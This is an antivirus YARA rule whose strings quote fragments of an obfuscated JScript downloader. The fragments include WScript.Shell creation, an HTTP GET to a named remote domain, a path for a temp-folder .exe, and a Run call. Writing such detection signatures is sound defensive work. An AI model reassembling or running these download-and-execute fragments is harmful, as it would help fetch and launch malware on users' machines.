rule sig_20160401_8c5c0341c38d4caf1103f779b3900a69 {
  meta:
    description = "datamaliciousorder - file 20160401_8c5c0341c38d4caf1103f779b3900a69.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "23fb85c2af619582789bd37e2060bc9d5d3027294341248ceff64ee3786b2515"

  strings:
    $s1  = "var CwtWe = function DnZel() {return WScript[KlMmv](\"WScript\"+\".Shell\");}(), BsKl = 11;" fullword ascii
    $s2  = "function NpFj(AyHs, HuMsp){TvAt = TvAt * 1; return AyHs - HuMsp;};" fullword ascii
    $s3  = "NeTg[EmNjs](\"G\" + \"ET\", \"http://garmulewicz.pl/v4yhsa\", false);" fullword ascii
    $s4  = "if (NeTg[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function AdpPrd() {return CwtWe[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"fM2WFUvLt24rYhW.ex\" + \"e\";};" fullword ascii
    $s6  = "function MklKk(){return JsWi + \"\";};" fullword ascii
    $s7  = "function VrgFf() {return ((IeLq == true) && (IeLq == UuAp)) ? 1 : TvAt;};" fullword ascii
    $s8  = "function DnZfz(){return KlMmv;};" fullword ascii
    $s9  = "var NgtGz = false;" fullword ascii
    $s10 = "function LuMrc(){return 23;};" fullword ascii
    $s11 = "var MreGlh = new this[\"Date\"]();" fullword ascii
    $s12 = "UuAp = true; " fullword ascii
    $s13 = "var UuAp = false;" fullword ascii
    $s14 = "var IeLq = false;" fullword ascii
    $s15 = "function BlLu()" fullword ascii
    $s16 = "return NpFj(BksUb, PmUwk);" fullword ascii
    $s17 = "IeLq = true; " fullword ascii
    $s18 = "function VrIl(DzIr){CwtWe[\"R\"+\"un\"](DzIr, TvAt, TvAt);};" fullword ascii
    $s19 = "function XqUvl(KoIwd) {var VkmZzy = (1, 2, 3, 4, 5, KoIwd); return VkmZzy;};" fullword ascii
    $s20 = "}while (ZiEeg);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}